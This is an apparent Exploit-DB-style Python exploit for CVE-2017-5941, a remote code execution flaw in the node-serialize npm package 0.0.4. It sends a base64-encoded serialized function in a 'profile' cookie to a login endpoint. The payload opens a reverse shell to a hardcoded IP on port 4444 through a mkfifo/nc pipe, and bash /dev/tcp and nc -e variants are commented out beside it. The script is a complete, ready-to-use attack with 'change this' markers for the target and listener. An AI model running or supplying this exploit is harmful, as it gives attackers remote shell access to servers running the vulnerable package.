# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution (2)
# Exploit Author: UndeadLarva
# Software Link: https://www.npmjs.com/package/node-serialize
# Version: 0.0.4
# CVE: CVE-2017-5941

import requests
import re
import base64
import sys

url = 'http://10.10.45.195:8080/login' # change this

payload = ("require('http').ServerResponse.prototype.end = (function (end) {"
"return function () {"
"['close', 'connect', 'data', 'drain', 'end', 'error', 'lookup', 'timeout', ''].forEach(this.socket.removeAllListeners.bind(this.socket));"
"console.log('still inside');"
"const { exec } = require('child_process');"
#"exec('bash -i >& /dev/tcp/10.17.50.216/4444 0>&1');" # change this
#"exec('nc -e /bin/bash 10.17.50.216 4444');" # change this
"exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.17.50.216 4444 >/tmp/f');" # change this
"}"
"})(require('http').ServerResponse.prototype.end)")

# rce = "_$$ND_FUNC$$_process.exit(0)"
# code ="_$$ND_FUNC$$_console.log('behind you')"
code = "_$$ND_FUNC$$_" + payload

string = '{"username":"TheUndead","country":"worldwide","city":"Tyr", "exec": "'+code+'"}'
string = bytes(string, "ascii")
print(str(base64.b64encode(string)))

session = requests.Session()
cookie = {'profile': str(base64.b64encode(string))}

try:
    response = session.get(url, cookies=cookie).text
    print(response)
except requests.exceptions.RequestException as e:
    print('Oops!')
    sys.exit(1)
